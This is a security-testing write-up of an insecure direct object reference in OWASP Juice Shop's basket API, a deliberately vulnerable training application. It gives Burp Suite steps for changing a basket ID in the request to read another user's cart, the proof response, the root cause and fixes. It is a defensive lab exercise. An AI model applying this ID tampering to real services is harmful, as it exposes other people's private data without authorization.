# Broken Access Control – Insecure Direct Object Reference (IDOR)

## Application Information

**Target:** OWASP Juice Shop
**Testing Tool:** Burp Suite
**Attacker Environment:** Kali Linux

**OWASP Category:** OWASP Top 10 – A01 Broken Access Control

---

# 1. Vulnerability Summary

The application exposes a **Broken Access Control** vulnerability in the basket API endpoint.
An authenticated user can modify the basket identifier in the request URL to access other users’ shopping carts.

The application does **not verify ownership of the requested basket resource**, allowing unauthorized access to sensitive data belonging to other users.

This is a classic **Insecure Direct Object Reference (IDOR)** vulnerability.

---

# 2. Vulnerability Classification

| Category           | Value                     |
| ------------------ | ------------------------- |
| OWASP Top 10       | A01 Broken Access Control |
| Vulnerability Type | IDOR                      |
| Attack Vector      | Authenticated User        |
| Impact             | Unauthorized Data Access  |
| Severity           | High                      |

---

# 3. Affected Endpoint

```
GET /rest/basket/{id}
```

Example:

```
GET /rest/basket/6
```

---

# 4. Attack Scenario

A malicious user can modify the basket ID in the request to access another user's basket.

Example manipulation:

```
/rest/basket/6
```

changed to

```
/rest/basket/1
```

If the application returns basket details belonging to another user, it confirms **Broken Access Control**.

---

# 5. Steps to Reproduce

## Step 1 — Register a New User Account

Example credentials used during testing:

```
email: user2@gmail.com
password: User2
```

---

## Step 2 — Log In Using the Registered Account

Login using the newly created credentials.

```
email: user2@gmail.com
password: User2
```

---

## Step 3 — Add Product to Basket

Navigate to the products page and click:

```
Add to Basket
```

This action triggers a request that retrieves basket information.

---

## Step 4 — Intercept the Request

Capture the request using **Burp Suite Proxy**.

Captured request:

```http
GET /rest/basket/6 HTTP/1.1
Host: localhost:3000
Authorization: Bearer <JWT_TOKEN>
```

The basket identifier **(6)** is visible in the URL.

---

## Step 5 — Send the Request to Burp Repeater

Right-click the request and select:

```
Send to Repeater
```

This allows manual manipulation of the request.

---

## Step 6 — Modify the Basket ID

Change the request from:

```
GET /rest/basket/6
```

to:

```
GET /rest/basket/1
```

---

## Step 7 — Send the Modified Request

Send the manipulated request using **Burp Repeater**.

---

# 6. Proof of Exploitation

The server returns a successful response with data belonging to another user.

Response:

```http
HTTP/1.1 200 OK
```

Returned JSON:

```json
{
  "status": "success",
  "data": {
    "id": 1,
    "UserId": 1,
    "Products": [
      {
        "id": 1,
        "name": "Apple Juice (1000ml)",
        "price": 1.99
      }
    ]
  }
}
```

The response shows:

```
UserId: 1
```

However, the authenticated user is different.

This confirms **unauthorized access to another user's basket**.

---

# 7. Impact

An attacker can access shopping carts belonging to other users by manipulating the basket identifier.

Potential risks include:

* Unauthorized access to user purchase data
* Exposure of user activity and behavior
* Privacy violations
* Potential data leakage in production environments

In a real-world e-commerce platform this could expose:

* customer orders
* personal information
* purchasing patterns

---

# 8. Root Cause

The application fails to enforce authorization checks when retrieving basket resources.

The server trusts the user-provided basket identifier instead of verifying ownership.

The vulnerable logic likely resembles:

```python
if basketId exists:
    return basket
```

Instead of secure logic:

```python
if basket.owner == logged_in_user:
    return basket
else:
    deny access
```

---

# 9. Severity Assessment

| Metric              | Value |
| ------------------- | ----- |
| Attack Complexity   | Low   |
| Privileges Required | Low   |
| User Interaction    | None  |
| Impact              | High  |

**Estimated Severity:** High

---

# 10. Mitigation

The application should enforce strict authorization checks before returning user-specific resources.

Recommended fix:

```
Verify resource ownership before returning data.
```

Example secure logic:

```python
if basket.userId == authenticatedUserId:
    return basket
else:
    return 403 Forbidden
```

Additional recommendations:

* Avoid exposing sequential object identifiers
* Implement proper access control checks
* Use indirect object references
* Perform authorization validation at the API level

---

# 11. Screenshots (Evidence)

Screenshots demonstrating the exploitation:

| Figure                              | Description                         |
| ----------------------------------- | ----------------------------------- |
| Figure 1 (1.1.png)                  | Add product to basket               |
| Figure 2 (1.png)                    | Request intercepted in Burp Suite   |
| Figure 3 (2.png)                    | Request sent to Burp Repeater       |
| Figure 4 (3.png – request section)  | Basket ID modified                  |
| Figure 5 (3.png – response section) | Unauthorized basket access returned |

---

# 12. Conclusion

Testing identified a **Broken Access Control vulnerability (IDOR)** in the basket API endpoint of OWASP Juice Shop.

The application fails to validate resource ownership, allowing authenticated users to access baskets belonging to other users by modifying the basket identifier.

Proper authorization checks must be implemented to prevent unauthorized access to sensitive resources.